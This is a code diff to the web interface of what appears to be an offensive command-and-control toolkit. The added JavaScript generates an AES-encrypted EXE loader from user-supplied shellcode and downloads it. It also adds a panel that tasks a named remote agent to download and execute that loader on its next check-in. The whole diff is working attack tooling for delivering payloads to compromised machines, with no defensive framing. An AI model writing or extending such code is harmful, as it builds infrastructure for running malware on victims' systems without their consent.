@@ -194,6 +194,16 @@
             <button onclick="downloadStub('c')">.c Loader</button>
             <button onclick="downloadStub('python')">.py Loader</button>
             <button onclick="downloadStub('exe')">.exe Loader</button>
+            <button id="generateExeLoaderBtn">🔐 Generate AES-Encrypted EXE</button>
+            <div id="deployOptions" style="display: none; margin-top: 15px; padding: 10px; border: 1px solid #ccc; border-radius: 4px;">
+                <h4>Deployment Options</h4>
+                <div class="form-group">
+                    <label for="agentId">Target Agent ID:</label>
+                    <input type="text" id="agentId" placeholder="e.g., agent_123456">
+                </div>
+                <button id="deployToAgentBtn">📡 Deploy Loader to Agent</button>
+                <div id="deployStatus" style="margin-top: 10px; font-style: italic;"></div>
+            </div>
         </div>
     </div>
 
@@ -514,6 +524,117 @@ int main() {
             localStorage.setItem('theme', next);
             document.body.setAttribute('data-theme', next);
         }
+
+        // Function to generate encrypted EXE loader
+        document.getElementById('generateExeLoaderBtn').addEventListener('click', function() {
+            if (!encodedShellcode) {
+                alert('Please generate shellcode first!');
+                return;
+            }
+
+            // Show loading state
+            this.innerHTML = '⏳ Generating...';
+            this.disabled = true;
+            
+            // Make request to generate loader
+            fetch('/generate_loader_exe', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ shellcode: encodedShellcode })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    return response.json().then(err => { throw new Error(err.error || 'Failed to generate loader'); });
+                }
+                return response.blob();
+            })
+            .then(blob => {
+                // Create download link
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'shellcode_loader.exe';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                
+                // Show deploy options
+                document.getElementById('deployOptions').style.display = 'block';
+                
+                // Update button state
+                this.innerHTML = '✅ Generated!';
+                setTimeout(() => {
+                    this.innerHTML = '🔐 Generate AES-Encrypted EXE';
+                    this.disabled = false;
+                }, 1500);
+            })
+            .catch(err => {
+                alert('Error: ' + err.message);
+                this.innerHTML = '❌ Failed';
+                setTimeout(() => {
+                    this.innerHTML = '🔐 Generate AES-Encrypted EXE';
+                    this.disabled = false;
+                }, 1500);
+            });
+        });
+        
+        // Function to deploy loader to an agent
+        document.getElementById('deployToAgentBtn').addEventListener('click', function() {
+            const agentId = document.getElementById('agentId').value.trim();
+            
+            if (!agentId) {
+                alert('Please enter an agent ID');
+                return;
+            }
+            
+            // Get server URL
+            const serverUrl = window.location.origin;
+            const loaderUrl = `${serverUrl}/generate_loader_exe`;
+            
+            // Show loading state
+            this.innerHTML = '⏳ Deploying...';
+            this.disabled = true;
+            document.getElementById('deployStatus').textContent = 'Creating task for agent...';
+            
+            // Create task for agent
+            fetch('/api/tasks', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    agent_id: agentId,
+                    loader_url: loaderUrl
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.error) {
+                    throw new Error(data.error);
+                }
+                
+                // Show success message
+                document.getElementById('deployStatus').innerHTML = 
+                    `<span style="color: green;">✅ Task created successfully!</span><br>` +
+                    `Task ID: ${data.task_id}<br>` +
+                    `The agent will download and execute the loader on next check-in.`;
+                
+                // Update button state
+                this.innerHTML = '✅ Deployed!';
+                setTimeout(() => {
+                    this.innerHTML = '📡 Deploy Loader to Agent';
+                    this.disabled = false;
+                }, 1500);
+            })
+            .catch(err => {
+                document.getElementById('deployStatus').innerHTML = 
+                    `<span style="color: red;">❌ Deployment failed: ${err.message}</span>`;
+                
+                this.innerHTML = '❌ Failed';
+                setTimeout(() => {
+                    this.innerHTML = '📡 Deploy Loader to Agent';
+                    this.disabled = false;
+                }, 1500);
+            });
+        });
 
         window.onload = function () {
             const savedTheme = localStorage.getItem('theme') || 'light';
